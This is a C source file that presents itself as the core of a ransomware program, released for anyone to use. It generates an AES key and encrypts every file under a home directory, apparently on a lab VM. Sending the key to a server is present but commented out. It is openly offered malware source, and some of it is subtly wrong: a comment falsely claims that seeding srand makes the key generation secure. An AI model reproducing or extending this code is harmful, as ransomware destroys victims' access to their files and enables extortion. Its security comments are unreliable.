/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary libraries
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <libgen.h>
#include <openssl/rsa.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include "lib/file_system.h"
#include "lib/encryption.h"
#include "lib/network.h"

//this define variable is used to define the "root" section to start the encryption from
#define HOMEDIR "/home/vagrant/Downloads"

/*
This is the main function where the core process of the ransomware resides
*/
int main(void) {
    //creating necessary variables
    DIR *directory;
    EVP_PKEY *clientKeyPair = NULL;
    EVP_PKEY *serverPublicKey = malloc(sizeof(EVP_PKEY *));
    EVP_CIPHER *cipher = NULL;
    char key[16];
    char iv[16];
    int socket_connection;
    int result;
    char * data;

    //setting seed basaed on current time to ensure PRNG is secure
    srand(time(NULL));

    //generate key, iv, and the cipher
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));
    cipher = generateAESCipher();

    //walk the filesystem to get access to the directory structure
    directory = walkFileSystem(HOMEDIR);

    //walk the directory structure encrypting each file found
    walkDirectory(directory, HOMEDIR, cipher, key, iv);
    
    //close the direcotry
    closedir(directory);

    //communicate with server and send aes key
    //sendAES(key, iv);

    return 0;
}
